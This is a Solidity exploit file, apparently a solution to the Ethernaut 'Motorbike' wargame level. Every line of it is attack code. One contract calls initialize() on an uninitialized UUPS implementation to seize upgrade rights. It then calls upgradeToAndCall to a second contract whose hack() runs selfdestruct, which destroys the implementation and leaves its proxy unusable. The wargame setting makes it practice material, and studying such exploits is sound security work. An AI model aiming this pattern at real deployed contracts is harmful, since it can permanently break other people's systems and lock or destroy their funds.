// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract HackerMotorbike {
    address public engine;
    constructor(address _engine) {
        engine = _engine;
    }

    function hack(address _hackAddress) external {
        IEngine(engine).initialize();
        IEngine(engine).upgradeToAndCall(_hackAddress, abi.encodeWithSignature("hack()"));
    }

    function changeEngine(address _engine) external {
        engine = _engine;
    }
}

contract HackMotorbike {
    constructor() {
    }

    function hack() external {
        selfdestruct(payable(address(0)));
    }
}